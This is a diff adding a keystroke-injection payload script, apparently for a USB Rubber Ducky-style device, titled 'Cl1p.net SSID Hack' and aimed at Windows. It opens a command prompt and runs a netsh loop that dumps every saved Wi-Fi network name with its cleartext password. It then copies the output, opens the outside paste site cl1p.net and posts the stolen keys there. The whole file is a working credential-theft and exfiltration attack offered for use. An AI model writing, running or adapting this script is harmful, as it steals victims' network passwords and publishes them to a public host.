@@ -1,0 +1,52 @@
+REM Title: Cl1p.net SSID Hack
+REM Author: Argentum
+REM Description: This will take the network info and post it to https://cl1p.net/SSIDhack
+REM Target: Windows
+REM Time: 7 seconds
+
+DELAY 500
+
+REM Open cmd
+WINDOWS r
+DELAY 1000
+STRING cmd
+DELAY 500
+ENTER
+DELAY 250 
+
+REM GET Network info
+STRINGLN netsh wlan show drivers
+DELAY 300
+STRINGLN for /f "skip=9 tokens=1,2 delims=:" %i in ('netsh wlan show profiles') do @echo %j | netsh wlan show profiles %j key=clear | findstr /C:"SSID name" /C:"Key Content"
+DELAY 250
+
+REM select all network info and put it on clipboard
+CONTROL a
+DELAY 500
+CONTROL c
+DELAY 500
+
+REM go to https://cl1p.net/SSIDhack and exit cmd
+STRINGLN start https://cl1p.net/SSIDhack && exit
+DELAY 1000
+
+REM tab 4 times then paste then create clip
+TAB
+DELAY 250 
+TAB
+DELAY 250
+TAB
+DELAY 250
+TAB
+DELAY 250
+TAB
+DELAY 250
+CONTROL v
+DELAY 250
+TAB
+DELAY 250
+ENTER
+DELAY 250
+
+REM close browser
+CONTROL w
